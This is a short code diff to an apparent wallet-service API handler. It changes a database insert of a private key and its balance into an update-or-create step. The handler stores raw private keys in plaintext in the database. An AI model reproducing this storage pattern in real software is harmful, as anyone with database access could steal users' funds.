@@ -37,12 +37,17 @@ export default async function handler(
   const address = await signer.getAddress();
   const balance = await provider.getBalance(address);
 
-  await Address.create({
-    private_key,
-    balance,
-    is_processing: false,
-    pending_amount: [],
-  });
+  const exist = await Address.exists({ private_key });
+  if (exist) {
+    await Address.updateOne({ private_key }, { balance });
+  } else {
+    await Address.create({
+      private_key,
+      balance,
+      is_processing: false,
+      pending_amount: [],
+    });
+  }
 
   res.status(200).json({ balance: balance.toString() });
 }
